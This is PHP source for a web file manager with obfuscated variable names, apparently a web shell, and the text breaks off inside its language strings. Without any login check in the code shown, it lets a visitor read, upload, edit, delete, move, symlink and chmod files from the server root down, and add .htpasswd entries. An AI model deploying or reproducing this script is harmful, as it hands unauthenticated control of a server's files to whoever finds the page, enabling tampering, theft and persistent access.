<?php
$sp53bb19 = 'en'; $spc6d893 = './'; $sp64a3ad = '/'; $sp4c2561 = 453; $sp8f6bba = 20; $sp09646e = 70; $spa5bde5 = htmlentities(basename($_SERVER['PHP_SELF'])); $spc6d893 = relpathtoabspath($spc6d893, getcwd()); $sp64a3ad = relpathtoabspath($sp64a3ad, getcwd()); $sp6b23c0 = getwords($sp53bb19); if (ini_get('magic_quotes_gpc')) { array_walk($_GET, 'strip'); array_walk($_POST, 'strip'); array_walk($_REQUEST, 'strip'); } if (isset($_GET['imageid'])) { header('Content-Type: image/gif'); echo getimage($_GET['imageid']); die; } ini_set('session.use_cookies', FALSE); ini_set('session.use_trans_sid', FALSE); session_name('id'); session_start(); $spf785f6 = $spdfbf8e = ''; $spab9636 = FALSE; if (isset($_REQUEST['action'])) { switch ($_REQUEST['action']) { case 'treeon': $_SESSION['tree'] = array(); $_SESSION['hassubdirs'][$sp64a3ad] = tree_hassubdirs($sp64a3ad); tree_plus($_SESSION['tree'], $_SESSION['hassubdirs'], $sp64a3ad); frameset(); die; case 'treeoff': $_SESSION['tree'] = NULL; $_SESSION['hassubdirs'] = NULL; dirlisting(); die; } } if (!isset($_SESSION['dir'])) { $_SESSION['dir'] = $spc6d893; $spab9636 = TRUE; } if (!empty($_REQUEST['dir'])) { $sp96604e = relpathtoabspath($_REQUEST['dir'], $_SESSION['dir']); if (@is_file($sp96604e) && @is_readable($sp96604e)) { if (is_script($sp96604e)) { $_GET['showh'] = $sp96604e; } else { $_GET['show'] = $sp96604e; } } elseif ($_SESSION['dir'] != $sp96604e) { $_SESSION['dir'] = $sp96604e; $spab9636 = TRUE; } } if (!empty($_GET['show'])) { $spb4da9a = relpathtoabspath($_GET['show'], $_SESSION['dir']); if (!show($spb4da9a)) { $spf785f6 = buildphrase('&quot;<b>' . htmlentities($spb4da9a) . '</b>&quot;', $sp6b23c0['cantbeshown']); } else { die; } } if (!empty($_GET['showh'])) { $spb42e74 = relpathtoabspath($_GET['showh'], $_SESSION['dir']); if (!show_highlight($spb42e74)) { $spf785f6 = buildphrase('&quot;<b>' . htmlentities($spb42e74) . '</b>&quot;', $sp6b23c0['cantbeshown']); } else { die; } } if (isset($_FILES['upload'])) { $spa3ecf0 = relpathtoabspath($_FILES['upload']['name'], $_SESSION['dir']); if (@is_writable($_SESSION['dir']) && @move_uploaded_file($_FILES['upload']['tmp_name'], $spa3ecf0) && (!isset($sp6cdbd5) || chmod($spa3ecf0, $sp6cdbd5))) { $spdfbf8e = buildphrase(array('&quot;<b>' . htmlentities(basename($spa3ecf0)) . '</b>&quot;', '&quot;<b>' . htmlentities($_SESSION['dir']) . '</b>&quot;'), $sp6b23c0['uploaded']); } else { $spf785f6 = buildphrase(array('&quot;<b>' . htmlentities(basename($spa3ecf0)) . '</b>&quot;', '&quot;<b>' . htmlentities($_SESSION['dir']) . '</b>&quot;'), $sp6b23c0['notuploaded']); } } if (!empty($_GET['create']) && $_GET['type'] == 'file') { $spa3ecf0 = relpathtoabspath($_GET['create'], $_SESSION['dir']); if (substr($spa3ecf0, strlen($spa3ecf0) - 1, 1) == '/') { $spa3ecf0 = substr($spa3ecf0, 0, strlen($spa3ecf0) - 1); } if (is_free($spa3ecf0) && touch($spa3ecf0) && (!isset($sp5aa360) || chmod($spa3ecf0, $sp5aa360))) { $spdfbf8e = buildphrase('&quot;<b>' . htmlentities($spa3ecf0) . '</b>&quot;', $sp6b23c0['created']); $_REQUEST['edit'] = $spa3ecf0; } else { $spf785f6 = buildphrase('&quot;<b>' . htmlentities($spa3ecf0) . '</b>&quot;', $sp6b23c0['notcreated']); } } if (!empty($_GET['create']) && $_GET['type'] == 'dir') { $spa3ecf0 = relpathtoabspath($_GET['create'], $_SESSION['dir']); if (is_free($spa3ecf0) && @mkdir($spa3ecf0, $sp4c2561)) { $spdfbf8e = buildphrase('&quot;<b>' . htmlentities($spa3ecf0) . '</b>&quot;', $sp6b23c0['created']); $spab9636 = TRUE; if (!empty($_SESSION['tree'])) { $spa3ecf0 = spath(dirname($spa3ecf0)); $_SESSION['hassubdirs'][$spa3ecf0] = TRUE; tree_plus($_SESSION['tree'], $_SESSION['hassubdirs'], $spa3ecf0); } } else { $spf785f6 = buildphrase('&quot;<b>' . htmlentities($spa3ecf0) . '</b>&quot;', $sp6b23c0['notcreated']); } } if (!empty($_GET['symlinktarget']) && empty($_GET['symlink'])) { $sp88373a = relpathtoabspath($_GET['symlinktarget'], $_SESSION['dir']); html_header($sp6b23c0['createsymlink']); ?>
	<form action="<?php  echo $spa5bde5; ?>
" method="get">
	<input type="hidden" name="id" value="<?php  echo session_id(); ?>
">
	<input type="hidden" name="symlinktarget" value="<?php  echo htmlentities($_GET['symlinktarget']); ?>
">
	<table border="0" cellspacing="0" cellpadding="0"><tr><td bgcolor="#888888">
	<table border="0" cellspacing="1" cellpadding="4">
	<tr>
		<td bgcolor="#EEEEEE" align="center"><b><?php  echo htmlentities($_SERVER['SERVER_NAME']); ?>
</b></td>
		<td bgcolor="#EEEEEE" align="center"><?php  echo htmlentities($_SERVER['SERVER_SOFTWARE']); ?>
</td>
	</tr>
	<tr>
		<td colspan="2" bgcolor="#EEEEEE">
			<table border="0">
			<tr>
				<td valign="top"><?php  echo $sp6b23c0['target']; ?>
:&nbsp;</td>
				<td>
					<b><?php  echo htmlentities($_GET['symlinktarget']); ?>
</b><br>
					<input type="checkbox" name="relative" value="yes" id="checkbox_relative" checked>
					<label for="checkbox_relative"><?php  echo $sp6b23c0['reltarget']; ?>
</label>
				</td>
			</tr>
			<tr>
				<td><?php  echo $sp6b23c0['symlink']; ?>
:&nbsp;</td>
				<td><input type="text" name="symlink" value="<?php  echo htmlentities(spath(dirname($sp88373a))); ?>
" size="<?php  $sp92ea66 = strlen($_GET['symlinktarget']) + 9; if ($sp92ea66 < 30) { $sp92ea66 = 30; } echo $sp92ea66; ?>
"></td>
			</tr>
			<tr>
				<td>&nbsp;</td>
				<td><input type="submit" value="<?php  echo $sp6b23c0['create']; ?>
"></td>
			</tr>
			</table>
		</td>
	</tr>
	</table>
	</td></tr></table>
	</form>
<?php  html_footer(); die; } if (!empty($_GET['symlink']) && !empty($_GET['symlinktarget'])) { $sp473eeb = relpathtoabspath($_GET['symlink'], $_SESSION['dir']); $sp262d98 = $_GET['symlinktarget']; if (@is_dir($sp473eeb)) { $sp473eeb = spath($sp473eeb) . basename($sp262d98); } if ($sp473eeb == $sp262d98) { $spf785f6 = buildphrase(array('&quot;<b>' . htmlentities($sp473eeb) . '</b>&quot;', '&quot;<b>' . htmlentities($sp262d98) . '</b>&quot;'), $sp6b23c0['samefiles']); } else { if (@$_GET['relative'] == 'yes') { $sp262d98 = abspathtorelpath(dirname($sp473eeb), $sp262d98); } else { $sp262d98 = $_GET['symlinktarget']; } if (is_free($sp473eeb) && @symlink($sp262d98, $sp473eeb)) { $spdfbf8e = buildphrase('&quot;<b>' . htmlentities($sp473eeb) . '</b>&quot;', $sp6b23c0['created']); } else { $spf785f6 = buildphrase('&quot;<b>' . htmlentities($sp473eeb) . '</b>&quot;', $sp6b23c0['notcreated']); } } } if (!empty($_GET['delete'])) { $sp67b196 = relpathtoabspath($_GET['delete'], $_SESSION['dir']); if (@$_GET['sure'] == 'TRUE') { if (remove($sp67b196)) { $spdfbf8e = buildphrase('&quot;<b>' . htmlentities($sp67b196) . '</b>&quot;', $sp6b23c0['deleted']); } else { $spf785f6 = buildphrase('&quot;<b>' . htmlentities($sp67b196) . '</b>&quot;', $sp6b23c0['notdeleted']); } } else { html_header($sp6b23c0['delete']); ?>
	<p>
	<table border="0" cellspacing="0" cellpadding="0"><tr><td bgcolor="#888888">
	<table border="0" cellspacing="1" cellpadding="4">
	<tr>
		<td bgcolor="#EEEEEE" align="center"><b><?php  echo htmlentities($_SERVER['SERVER_NAME']); ?>
</b></td>
		<td bgcolor="#EEEEEE" align="center"><?php  echo htmlentities($_SERVER['SERVER_SOFTWARE']); ?>
</td>
	</tr>
	<tr>
		<td colspan="2" bgcolor="#FFFFFF"><?php  echo buildphrase('&quot;<b>' . htmlentities($sp67b196) . '</b>&quot;', $sp6b23c0['suredelete']); ?>
</td>
	</tr>
	<tr>
		<td colspan="2" align="center" bgcolor="#EEEEEE">
			<a href="<?php  echo "{$spa5bde5}?" . SID . '&delete=' . urlencode($sp67b196) . '&sure=TRUE'; ?>
">[ <?php  echo $sp6b23c0['yes']; ?>
 ]</a>
		</td>
	</tr>
	</table>
	</td></tr></table>
	</p>
<?php  html_footer(); die; } } if (!empty($_GET['permission'])) { $spd40e84 = relpathtoabspath($_GET['permission'], $_SESSION['dir']); if ($sp0992ce = @fileperms($spd40e84)) { if (!empty($_GET['set'])) { $sp0992ce = 0; if (isset($_GET['ur'])) { $sp0992ce |= 256; } if (isset($_GET['uw'])) { $sp0992ce |= 128; } if (isset($_GET['ux'])) { $sp0992ce |= 64; } if (isset($_GET['gr'])) { $sp0992ce |= 32; } if (isset($_GET['gw'])) { $sp0992ce |= 16; } if (isset($_GET['gx'])) { $sp0992ce |= 8; } if (isset($_GET['or'])) { $sp0992ce |= 4; } if (isset($_GET['ow'])) { $sp0992ce |= 2; } if (isset($_GET['ox'])) { $sp0992ce |= 1; } if (@chmod($_GET['permission'], $sp0992ce)) { $spdfbf8e = buildphrase(array('&quot<b>' . htmlentities($spd40e84) . '</b>&quot;', '&quot;<b>' . substr(octtostr("0{$sp0992ce}"), 1) . '</b>&quot; (<b>' . decoct($sp0992ce) . '</b>)'), $sp6b23c0['permsset']); } else { $spf785f6 = buildphrase('&quot;<b>' . htmlentities($spd40e84) . '</b>&quot;', $sp6b23c0['permsnotset']); } } else { html_header($sp6b23c0['permission']); ?>
	<form action="<?php  echo $spa5bde5; ?>
" method="get">
	<input type="hidden" name="id" value="<?php  echo session_id(); ?>
">
	<table border="0" cellspacing="0" cellpadding="0"><tr><td bgcolor="#888888">
	<table border="0" cellspacing="1" cellpadding="4">
	<tr>
		<td bgcolor="#EEEEEE" align="center"><b><?php  echo htmlentities($_SERVER['SERVER_NAME']); ?>
</b></td>
		<td bgcolor="#EEEEEE" align="center"><?php  echo htmlentities($_SERVER['SERVER_SOFTWARE']); ?>
</td>
	</tr>
	<tr>
		<td bgcolor="#EEEEEE" colspan="2">
			<table>
			<tr>
				<td><?php  echo $sp6b23c0['file']; ?>
:</td>
				<td><input type="text" name="permission" value="<?php  echo htmlentities($spd40e84); ?>
" size="<?php  echo textfieldsize($spd40e84); ?>
"></td>
				<td><input type="submit" value="<?php  echo $sp6b23c0['change']; ?>
"></td>
			</tr>
			<tr>
				<td valign="top">
					<?php  echo $sp6b23c0['permission']; ?>
:&nbsp;
					</form><form action="<?php  echo $spa5bde5; ?>
" method="get">
					<input type="hidden" name="id" value="<?php  echo session_id(); ?>
">
					<input type="hidden" name="permission" value="<?php  echo htmlentities($spd40e84); ?>
">
					<input type="hidden" name="set" value="TRUE">
				</td>
				<td colspan="2">
					<table border="0">
					<tr>
						<td>&nbsp;</td>
						<td><?php  echo $sp6b23c0['owner']; ?>
</td>
						<td><?php  echo $sp6b23c0['group']; ?>
</td>
						<td><?php  echo $sp6b23c0['other']; ?>
</td>
					</tr>
					<tr>
						<td><?php  echo $sp6b23c0['read']; ?>
:</td>
						<td align="center"><input type="checkbox" name="ur" value="1"<?php  if ($sp0992ce & 256) { echo ' checked'; } ?>
></td>
						<td align="center"><input type="checkbox" name="gr" value="1"<?php  if ($sp0992ce & 32) { echo ' checked'; } ?>
></td>
						<td align="center"><input type="checkbox" name="or" value="1"<?php  if ($sp0992ce & 4) { echo ' checked'; } ?>
></td>
					</tr>
					<tr>
						<td><?php  echo $sp6b23c0['write']; ?>
:</td>
						<td align="center"><input type="checkbox" name="uw" value="1"<?php  if ($sp0992ce & 128) { echo ' checked'; } ?>
></td>
						<td align="center"><input type="checkbox" name="gw" value="1"<?php  if ($sp0992ce & 16) { echo ' checked'; } ?>
></td>
						<td align="center"><input type="checkbox" name="ow" value="1"<?php  if ($sp0992ce & 2) { echo ' checked'; } ?>
></td>
					</tr>
					<tr>
						<td><?php  echo $sp6b23c0['exec']; ?>
:</td>
						<td align="center"><input type="checkbox" name="ux" value="1"<?php  if ($sp0992ce & 64) { echo ' checked'; } ?>
></td>
						<td align="center"><input type="checkbox" name="gx" value="1"<?php  if ($sp0992ce & 8) { echo ' checked'; } ?>
></td>
						<td align="center"><input type="checkbox" name="ox" value="1"<?php  if ($sp0992ce & 1) { echo ' checked'; } ?>
></td>
					</tr>
					</table>
				</td>
			</tr>
			<tr>
				<td>&nbsp;</td>
				<td colspan="2"><input type="submit" value="<?php  echo $sp6b23c0['setperms']; ?>
"></td>
			</tr>
			</table>
		</td>
	</tr>
	</table>
	</td></tr></table>
	</form>
<?php  html_footer(); die; } } else { $spf785f6 = buildphrase('&quot;<b>' . htmlentities($spd40e84) . '</b>&quot;', $sp6b23c0['permsnotset']); } } if (!empty($_GET['move'])) { $sp303618 = relpathtoabspath($_GET['move'], $_SESSION['dir']); if (!empty($_GET['destination'])) { $spaee12a = relpathtoabspath($_GET['destination'], dirname($sp303618)); if (@is_dir($spaee12a)) { $spaee12a = spath($spaee12a) . basename($sp303618); } if ($sp303618 == $spaee12a) { $spf785f6 = buildphrase(array('&quot;<b>' . htmlentities($sp303618) . '</b>&quot;', '&quot;<b>' . htmlentities($spaee12a) . '</b>&quot;'), $sp6b23c0['samefiles']); } else { if (is_free($spaee12a) && @rename($sp303618, $spaee12a)) { $spdfbf8e = buildphrase(array('&quot;<b>' . htmlentities($sp303618) . '</b>&quot;', '&quot;<b>' . htmlentities($spaee12a) . '</b>&quot;'), $sp6b23c0['moved']); } else { $spf785f6 = buildphrase(array('&quot;<b>' . htmlentities($sp303618) . '</b>&quot;', '&quot;<b>' . htmlentities($spaee12a) . '</b>&quot;'), $sp6b23c0['notmoved']); } } } else { html_header($sp6b23c0['move']); ?>
	<form action="<?php  echo $spa5bde5; ?>
" method="get">
	<input type="hidden" name="id" value="<?php  echo session_id(); ?>
">
	<input type="hidden" name="move" value="<?php  echo htmlentities($sp303618); ?>
">
	<table border="0" cellspacing="0" cellpadding="0"><tr><td bgcolor="#888888">
	<table border="0" cellspacing="1" cellpadding="4">
	<tr>
		<td bgcolor="#EEEEEE" align="center"><b><?php  echo htmlentities($_SERVER['SERVER_NAME']); ?>
</b></td>
		<td bgcolor="#EEEEEE" align="center"><?php  echo htmlentities($_SERVER['SERVER_SOFTWARE']); ?>
</td>
	</tr>
	<tr>
		<td colspan="2" bgcolor="#EEEEEE">
			<table border="0">
			<tr>
				<td><?php  echo $sp6b23c0['file']; ?>
:&nbsp;</td>
				<td><b><?php  echo htmlentities($sp303618); ?>
</b></td>
			</tr>
			<tr>
				<td><?php  echo $sp6b23c0['moveto']; ?>
:&nbsp;</td>
				<td><input type="text" name="destination" value="<?php  echo htmlentities(spath(dirname($sp303618))); ?>
" size="<?php  echo textfieldsize($sp303618); ?>
"></td>
			</tr>
			<tr>
				<td>&nbsp;</td>
				<td><input type="submit" value="<?php  echo $sp6b23c0['move']; ?>
"></td>
			</tr>
			</table>
		</td>
	</tr>
	</table>
	</td></tr></table>
	</form>
<?php  html_footer(); die; } } if (!empty($_GET['cpy'])) { $sp8add43 = relpathtoabspath($_GET['cpy'], $_SESSION['dir']); if (!empty($_GET['destination'])) { $spaee12a = relpathtoabspath($_GET['destination'], dirname($sp8add43)); if (@is_dir($spaee12a)) { $spaee12a = spath($spaee12a) . basename($sp8add43); } if ($sp8add43 == $spaee12a) { $spf785f6 = buildphrase(array('&quot;<b>' . htmlentities($sp8add43) . '</b>&quot;', '&quot;<b>' . htmlentities($spaee12a) . '</b>&quot;'), $sp6b23c0['samefiles']); } else { if (is_free($spaee12a) && @copy($sp8add43, $spaee12a)) { $spdfbf8e = buildphrase(array('&quot;<b>' . htmlentities($sp8add43) . '</b>&quot;', '&quot;<b>' . htmlentities($spaee12a) . '</b>&quot;'), $sp6b23c0['copied']); } else { $spf785f6 = buildphrase(array('&quot;<b>' . htmlentities($sp8add43) . '</b>&quot;', '&quot;<b>' . htmlentities($spaee12a) . '</b>&quot;'), $sp6b23c0['notcopied']); } } } else { html_header($sp6b23c0['copy']); ?>
	<form action="<?php  echo $spa5bde5; ?>
" method="get">
	<input type="hidden" name="id" value="<?php  echo session_id(); ?>
">
	<input type="hidden" name="cpy" value="<?php  echo htmlentities($sp8add43); ?>
">
	<table border="0" cellspacing="0" cellpadding="0"><tr><td bgcolor="#888888">
	<table border="0" cellspacing="1" cellpadding="4">
	<tr>
		<td bgcolor="#EEEEEE" align="center"><b><?php  echo htmlentities($_SERVER['SERVER_NAME']); ?>
</b></td>
		<td bgcolor="#EEEEEE" align="center"><?php  echo htmlentities($_SERVER['SERVER_SOFTWARE']); ?>
</td>
	</tr>
	<tr>
		<td colspan="2" bgcolor="#EEEEEE">
			<table border="0">
			<tr>
				<td><?php  echo $sp6b23c0['file']; ?>
:&nbsp;</td>
				<td><b><?php  echo htmlentities($sp8add43); ?>
</b></td>
			</tr>
			<tr>
				<td><?php  echo $sp6b23c0['copyto']; ?>
:&nbsp;</td>
				<td><input type="text" name="destination" value="<?php  echo htmlentities(spath(dirname($sp8add43))); ?>
" size="<?php  echo textfieldsize($sp8add43); ?>
"></td>
			</tr>
			<tr>
				<td>&nbsp;</td>
				<td><input type="submit" value="<?php  echo $sp6b23c0['copy']; ?>
"></td>
			</tr>
			</table>
		</td>
	</tr>
	</table>
	</td></tr></table>
	</form>
<?php  html_footer(); die; } } if (!empty($_POST['edit']) && isset($_POST['save'])) { $sp575f63 = relpathtoabspath($_POST['edit'], $_SESSION['dir']); if ($sp224638 = @fopen($sp575f63, 'w')) { fwrite($sp224638, str_replace('
', '
', $_POST['content'])); fclose($sp224638); $spdfbf8e = buildphrase('&quot;<b>' . htmlentities($sp575f63) . '</b>&quot;', $sp6b23c0['saved']); } else { $spf785f6 = buildphrase('&quot;<b>' . htmlentities($sp575f63) . '</b>&quot;', $sp6b23c0['notsaved']); } } if (isset($_REQUEST['edit']) && !isset($_POST['save'])) { $spa3ecf0 = relpathtoabspath($_REQUEST['edit'], $_SESSION['dir']); if (@is_dir($spa3ecf0)) { $_SESSION['dir'] = $spa3ecf0; $spab9636 = TRUE; } else { if ($sp224638 = @fopen($spa3ecf0, 'r')) { html_header($sp6b23c0['edit']); ?>
	<form action="<?php  echo $spa5bde5; ?>
" method="get">
	<input type="hidden" name="id" value="<?php  echo session_id(); ?>
">
	<table border="0" cellspacing="0" cellpadding="0"><tr><td bgcolor="#888888">
	<table border="0" cellspacing="1" cellpadding="4">
	<tr>
		<td bgcolor="#EEEEEE" align="center"><b><?php  echo htmlentities($_SERVER['SERVER_NAME']); ?>
</b></td>
		<td bgcolor="#EEEEEE" align="center"><?php  echo htmlentities($_SERVER['SERVER_SOFTWARE']); ?>
</td>
	</tr>
	<tr>
		<td bgcolor="#EEEEEE" colspan="2">
			<table border="0" cellspacing="0" cellpadding="0">
			<tr>
				<td><?php  echo $sp6b23c0['file']; ?>
:&nbsp;</td>
				<td><input type="text" name="edit" value="<?php  echo htmlentities($spa3ecf0); ?>
" size="<?php  echo textfieldsize($spa3ecf0); ?>
">&nbsp;</td>
				<td><input type="submit" value="<?php  echo $sp6b23c0['change']; ?>
"></td>
			</tr>
			</table>
		</td>
	</tr>
	</table>
	</td></tr></table>
	</form>
	<form action="<?php  echo $spa5bde5; ?>
" method="post" name="f">
	<input type="hidden" name="id" value="<?php  echo session_id(); ?>
">
	<input type="hidden" name="edit" value="<?php  echo htmlentities($spa3ecf0); ?>
">
	<table border="0" cellspacing="0" cellpadding="0"><tr><td bgcolor="#888888">
	<table border="0" cellspacing="1" cellpadding="4">
	<tr>
		<td bgcolor="#EEEEFF" align="center"><textarea name="content" rows="<?php  echo $sp8f6bba; ?>
" cols="<?php  echo $sp09646e; ?>
" wrap="off" style="background: #EEEEFF; border: none;"><?php  if (isset($_POST['content'])) { echo htmlentities($_POST['content']); if (isset($_POST['add']) && !empty($_POST['username']) && !empty($_POST['password'])) { echo '
' . htmlentities($_POST['username'] . ':' . crypt($_POST['password'])); } } else { echo htmlentities(fread($sp224638, filesize($spa3ecf0))); } fclose($sp224638); ?>
</textarea></td>
	</tr>
<?php  if (basename($spa3ecf0) == '.htpasswd') { ?>
	<tr>
		<td bgcolor="#EEEEEE" align="center">
			<table border="0">
			<tr>
				<td><?php  echo $sp6b23c0['username']; ?>
:&nbsp;</td>
				<td><input type="text" name="username" size="15">&nbsp;</td>
				<td><?php  echo $sp6b23c0['password']; ?>
:&nbsp;</td>
				<td><input type="password" name="password" size="15">&nbsp;</td>
				<td><input type="submit" name="add" value="<?php  echo $sp6b23c0['add']; ?>
"></td>
			</tr>
			</table>
		</td>
	</tr>
<?php  } if (basename($spa3ecf0) == '.htaccess') { ?>
	<tr>
		<td bgcolor="#EEEEEE" align="center"><input type="button" value="<?php  echo $sp6b23c0['addauth']; ?>
" 
	</tr>
<?php  } ?>
	<tr>
		<td bgcolor="#EEEEEE" align="center">
			<input type="button" value="<?php  echo $sp6b23c0['reset']; ?>
" 
			<input type="button" value="<?php  echo $sp6b23c0['clear']; ?>
" '')">
			<input type="submit" name="save" value="<?php  echo $sp6b23c0['save']; ?>
">
		</td>
	</tr>
	</table>
	</td></tr></table>
	</form>
<?php  html_footer(); die; } else { $spf785f6 = buildphrase('&quot;<b>' . htmlentities($spa3ecf0) . '</b>&quot; ', $sp6b23c0['notopened']); } } } if (!empty($_SESSION['tree'])) { if (isset($_REQUEST['frame']) && $_REQUEST['frame'] == 'treeview') { treeview(); } else { if (isset($_GET['noupdate'])) { $spab9636 = FALSE; } dirlisting(TRUE); } } else { dirlisting(); } function strip(&$sp6ff357) { $sp6ff357 = stripslashes($sp6ff357); } function relpathtoabspath($spa3ecf0, $spa25e24) { $spa25e24 = spath($spa25e24); if (substr($spa3ecf0, 0, 1) != '/') { $spa3ecf0 = $spa25e24 . $spa3ecf0; } if (!@is_link($spa3ecf0) && ($spd6dd63 = realpath($spa3ecf0)) != FALSE) { $spa3ecf0 = $spd6dd63; } if (@is_dir($spa3ecf0) && !@is_link($spa3ecf0)) { $spa3ecf0 = spath($spa3ecf0); } return $spa3ecf0; } function abspathtorelpath($sp999b54, $sp262d98) { $sp999b54 = spath($sp999b54); $sp49de29 = ''; while ($sp999b54 != $sp262d98) { if ($sp999b54 == substr($sp262d98, 0, strlen($sp999b54))) { $sp49de29 .= substr($sp262d98, strlen($sp999b54)); break; } else { $sp49de29 .= '../'; $sp999b54 = strrev(strstr(strrev(substr($sp999b54, 0, strlen($sp999b54) - 1)), '/')); } } return $sp49de29; } function is_script($spa3ecf0) { return ereg('.php[3-4]?$', $spa3ecf0); } function spath($sp49de29) { if (substr($sp49de29, strlen($sp49de29) - 1, 1) != '/') { $sp49de29 .= '/'; } return $sp49de29; } function textfieldsize($sp6ff357) { $sp92ea66 = strlen($sp6ff357) + 5; if ($sp92ea66 < 30) { $sp92ea66 = 30; } return $sp92ea66; } function is_free($spa3ecf0) { global $sp6b23c0; if (@file_exists($spa3ecf0) && empty($_GET['overwrite'])) { html_header($sp6b23c0['alreadyexists']); ?>
	<p>
	<table border="0" cellspacing="0" cellpadding="0"><tr><td bgcolor="#888888">
	<table border="0" cellspacing="1" cellpadding="4">
	<tr>
		<td bgcolor="#EEEEEE" align="center"><b><?php  echo htmlentities($_SERVER['SERVER_NAME']); ?>
</b></td>
		<td bgcolor="#EEEEEE" align="center"><?php  echo htmlentities($_SERVER['SERVER_SOFTWARE']); ?>
</td>
	</tr>
	<tr>
		<td colspan="2" bgcolor="#FFFFFF"><?php  echo buildphrase('&quot;<b>' . htmlentities($spa3ecf0) . '</b>&quot;', $sp6b23c0['overwrite']); ?>
</td>
	</tr>
	<tr>
		<td colspan="2" align="center" bgcolor="#EEEEEE">
			<a href="<?php  echo "{$_SERVER['REQUEST_URI']}&overwrite=yes"; ?>
">[ <?php  echo $sp6b23c0['yes']; ?>
 ]</a>
		</td>
	</tr>
	</table>
	</td></tr></table>
	</p>
<?php  html_footer(); die; } if (!empty($_GET['overwrite'])) { return remove($spa3ecf0); } return TRUE; } function remove($spa3ecf0) { global $spab9636; if (@is_dir($spa3ecf0) && !@is_link($spa3ecf0)) { $spf785f6 = FALSE; if ($sp0992ce = @opendir($spa3ecf0 = spath($spa3ecf0))) { while (($sp224638 = readdir($sp0992ce)) !== FALSE) { if ($sp224638 != '.' && $sp224638 != '..' && !remove($spa3ecf0 . $sp224638)) { $spf785f6 = TRUE; } } } if ($spf785f6) { $spa73fbb = FALSE; } else { $spa73fbb = @rmdir($spa3ecf0); } $spab9636 = TRUE; if ($spa73fbb && !empty($_SESSION['tree'])) { $spa3ecf0 = spath(dirname($spa3ecf0)); $_SESSION['hassubdirs'][$spa3ecf0] = tree_hassubdirs($spa3ecf0); tree_plus($_SESSION['tree'], $_SESSION['hassubdirs'], $spa3ecf0, TRUE); } } else { $spa73fbb = @unlink($spa3ecf0); } return $spa73fbb; } function getwords($sp53bb19) { switch ($sp53bb19) { case 'de': $sp6b23c0['dir'] = 'Verzeichnis'; $sp6b23c0['file'] = 'Datei'; $sp6b23c0['filename'] = 'Dateiname'; $sp6b23c0['size'] = 'Gr&ouml;&szlig;e'; $sp6b23c0['permission'] = 'Rechte'; $sp6b23c0['functions'] = 'Funktionen'; $sp6b23c0['owner'] = 'Eigner'; $sp6b23c0['group'] = 'Gruppe'; $sp6b23c0['other'] = 'Andere'; $sp6b23c0['create'] = 'erstellen'; $sp6b23c0['copy'] = 'kopieren'; $sp6b23c0['copyto'] = 'kopieren nach'; $sp6b23c0['move'] = 'verschieben'; $sp6b23c0['moveto'] = 'verschieben nach'; $sp6b23c0['delete'] = 'l&ouml;schen'; $sp6b23c0['edit'] = 'editieren'; $sp6b23c0['read'] = 'lesen'; $sp6b23c0['write'] = 'schreiben'; $sp6b23c0['exec'] = 'ausf&uuml;hren'; $sp6b23c0['change'] = 'wechseln'; $sp6b23c0['upload'] = 'hochladen'; $sp6b23c0['configure'] = 'konfigurieren'; $sp6b23c0['yes'] = 'ja'; $sp6b23c0['no'] = 'nein'; $sp6b23c0['back'] = 'zur&uuml;ck'; $sp6b23c0['setperms'] = 'Rechte setzen'; $sp6b23c0['readingerror'] = 'Fehler beim Lesen von 1'; $sp6b23c0['permsset'] = 'Die Rechte von 1 wurden auf 2 gesetzt.'; $sp6b23c0['permsnotset'] = 'Die Rechte von 1 konnten nicht gesetzt werden.'; $sp6b23c0['uploaded'] = '1 wurde nach 2 hochgeladen.'; $sp6b23c0['notuploaded'] = '1 konnte nicht nach 2 hochgeladen werden.'; $sp6b23c0['moved'] = '1 wurde nach 2 verschoben.'; $sp6b23c0['notmoved'] = '1 konnte nicht nach 2 verschoben werden.'; $sp6b23c0['copied'] = '1 wurde nach 2 kopiert.'; $sp6b23c0['notcopied'] = '1 konnte nicht nach 2 kopiert werden.'; $sp6b23c0['created'] = '1 wurde erstellt.'; $sp6b23c0['notcreated'] = '1 konnte nicht erstellt werden.'; $sp6b23c0['deleted'] = '1 wurde gel&ouml;scht.'; $sp6b23c0['notdeleted'] = '1 konnte nicht gel&ouml;scht werden.'; $sp6b23c0['suredelete'] = '1 wirklich l&ouml;schen?'; $sp6b23c0['saved'] = '1 wurde gespeichert.'; $sp6b23c0['notsaved'] = '1 konnte nicht gespeichert werden.'; $sp6b23c0['reset'] = 'zur&uuml;cksetzen'; $sp6b23c0['clear'] = 'verwerfen'; $sp6b23c0['save'] = 'speichern'; $sp6b23c0['cantbeshown'] = '1 kann nicht angezeigt werden.'; $sp6b23c0['sourceof'] = 'Quelltext von 1'; $sp6b23c0['notopened'] = '1 konnte nicht ge&ouml;ffnet werden.'; $sp6b23c0['addauth'] = 'Standard-Authentifizierungseinstellungen hinzuf&uuml;gen'; $sp6b23c0['username'] = 'Benutzername'; $sp6b23c0['password'] = 'Kennwort'; $sp6b23c0['add'] = 'hinzuf&uuml;gen'; $sp6b23c0['treeon'] = 'Baumansicht aktivieren'; $sp6b23c0['treeoff'] = 'Baumansicht deaktivieren'; $sp6b23c0['symlink'] = 'Symbolischer Link'; $sp6b23c0['createsymlink'] = 'Link erstellen'; $sp6b23c0['target'] = 'Ziel'; $sp6b23c0['reltarget'] = 'Relative Pfadangabe des Ziels'; $sp6b23c0['alreadyexists'] = 'Die Datei existiert bereits.'; $sp6b23c0['overwrite'] = 'Soll 1 &uuml;berschrieben werden?'; $sp6b23c0['samefiles'] = '1 und 2 sind identisch.'; break; case 'cz': $sp6b23c0['dir'] = 'Adres&#xE1;&#x0159;'; $sp6b23c0['file'] = 'Soubor'; $sp6b23c0['filename'] = 'Jm&#xE9;no souboru'; $sp6b23c0['size'] = 'Velikost'; $sp6b23c0['permission'] = 'Pr&#xE1;va'; $sp6b23c0['functions'] = 'Functions'; $sp6b23c0['owner'] = 'Vlastn&#xED;k'; $sp6b23c0['group'] = 'Skupina'; $sp6b23c0['other'] = 'Ostatn&#xED;'; $sp6b23c0['create'] = 'vytvo&#x0159;it'; $sp6b23c0['copy'] = 'kop&#xED;rovat'; $sp6b23c0['copyto'] = 'kop&#xED;rovat do'; $sp6b23c0['move'] = 'p&#x0159;esunout'; $sp6b23c0['moveto'] = 'p&#x0159;esunout do'; $sp6b23c0['delete'] = 'odstranit'; $sp6b23c0['edit'] = '&#xFA;pravy'; $sp6b23c0['read'] = '&#x010D;ten&#xED;'; $sp6b23c0['write'] = 'z&#xE1;pis'; $sp6b23c0['exec'] = 'spu&#x0161;t&#x011B;n&#xED;'; $sp6b23c0['change'] = 'zm&#x011B;nit'; $sp6b23c0['upload'] = 'nahr&#xE1;t'; $sp6b23c0['configure'] = 